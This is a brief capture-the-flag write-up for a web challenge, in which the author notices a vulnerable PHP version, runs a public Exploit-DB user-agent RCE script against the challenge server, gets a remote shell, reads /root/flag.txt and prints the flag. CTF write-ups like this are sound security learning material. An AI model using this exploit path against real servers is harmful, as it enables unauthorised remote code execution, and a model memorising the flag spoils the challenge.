## challenge description
![Screenshot_20230725_010726](https://github.com/kiro6/writeups-ctfs/assets/57776872/25473ce1-0fd4-4578-bc32-c5a93a614c77)

### lets explore 

##### we have only one single page nothing in robots.txt ethier 
![Screenshot_20230725_010925](https://github.com/kiro6/writeups-ctfs/assets/57776872/62c432a0-d1a6-403f-b288-db55c99a8dbf)

##### lets try the repeater  , the first thing my eye saw was the PHP version 
![Screenshot_20230725_011132](https://github.com/kiro6/writeups-ctfs/assets/57776872/fde8d9b5-55ce-4a8b-8baf-0388a62e7c2f)

##### i searched for this version and it was vulnerable to user-agent RCE  

##### i used a script in exploit db [script](https://www.exploit-db.com/exploits/49933)

```
python3 49933.py    
Enter the full host url:  
http://139.144.184.115:8989/  
  
Interactive shell is opened on http://139.144.184.115:8989/    
Can't acces tty; job crontol turned off.  
$ ls  
index.php  
  
$ ls /  
bin  
boot  
dev  
etc  
home  
lib  
lib64  
media  
mnt  
opt  
proc  
root  
run  
sbin  
srv  
sys  
tmp  
usr  
var  
  
$ ls /root  
flag.txt  
  
$ cat /root/flag.txt  
BDSEC{php_15_7h3_b357_pr06r4mm1n6_l4n6u463}
```

### Easy one
